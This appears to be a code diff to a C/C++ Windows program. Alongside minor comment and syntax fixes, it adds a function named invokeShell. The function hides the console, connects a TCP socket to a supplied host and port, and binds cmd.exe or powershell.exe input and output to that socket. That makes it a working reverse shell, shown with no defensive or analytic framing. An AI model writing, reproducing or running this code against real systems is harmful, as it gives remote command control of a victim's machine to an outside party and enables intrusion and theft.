@@ -1,3 +1,4 @@
+// includes
 #include <stdio.h>
 #include <string.h>
 #include <tchar.h>
@@ -23,6 +24,7 @@ bool invokeShell(const char*, int, int shell);
 bool validateIpAddress(const char*);
 bool validatePort(int);
 
+// main function
 int main(int argc, char** argv)
 {
     char host_addr[16];
@@ -74,13 +76,47 @@ int main(int argc, char** argv)
     exit(0);
 }
 
+// main function for validating ip address
 bool validateIpAddress(const char* ipAddress) {
     struct sockaddr_in s;
     int result = inet_pton(AF_INET, (PCSTR)ipAddress, &(s.sin_addr));
     return result != 0;
 }
 
-bool validatePort(int port){
-    return (port > 0 && port < 65536)
+// function for validation port
+bool validatePort(int port) {
+    return (port > 0 && port < 65536);
 }
+// main function for getting the shell
+bool invokeShell(const char* host, int port, int shell) {
+    FreeConsole();
 
+    WSAStartup(MAKEWORD(2, 2), &wsaData);
+    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
+    sockAddr.sin_family = AF_INET;
+    //sockAddr.sin_addr.s_addr = inet_addr(host);
+    inet_pton(AF_INET, (PCSTR)host, &sockAddr.sin_addr.s_addr);
+    sockAddr.sin_port = htons(port);
+    WSAConnect(sock, (SOCKADDR*)&sockAddr, sizeof(sockAddr), NULL, NULL, NULL, NULL);
+
+    memset(&startInfo, 0, sizeof(startInfo));
+    startInfo.cb = sizeof(startInfo);
+    startInfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
+    startInfo.hStdInput = startInfo.hStdOutput = startInfo.hStdError = (HANDLE)sock;
+
+    TCHAR cmd[256] = TEXT("cmd.exe");
+    TCHAR power[256] = TEXT("powershell.exe");
+
+    switch (shell) {
+    case CMD:
+        CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, nullptr, nullptr, &startInfo, &procInfo);
+        break;
+    case POWERSHELL:
+        CreateProcess(NULL, power, NULL, NULL, TRUE, 0, nullptr, nullptr, &startInfo, &procInfo);
+        break;
+    default:
+        break;
+    }
+
+    return true;
+}
